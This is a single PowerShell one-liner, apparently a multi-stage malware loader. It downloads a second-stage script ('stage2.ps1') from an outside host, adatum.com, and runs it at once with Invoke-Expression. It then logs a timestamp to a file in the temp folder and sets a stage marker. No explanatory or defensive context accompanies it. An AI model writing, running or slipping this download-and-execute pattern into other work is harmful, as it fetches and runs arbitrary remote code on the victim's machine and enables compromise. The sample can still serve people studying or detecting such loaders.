
$FetchUrl = "http://adatum.com:80/stage2.ps1"; $StageScript = (New-Object System.Net.WebClient).DownloadString($FetchUrl); IEX $StageScript; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $StageMarker = "stage-6"
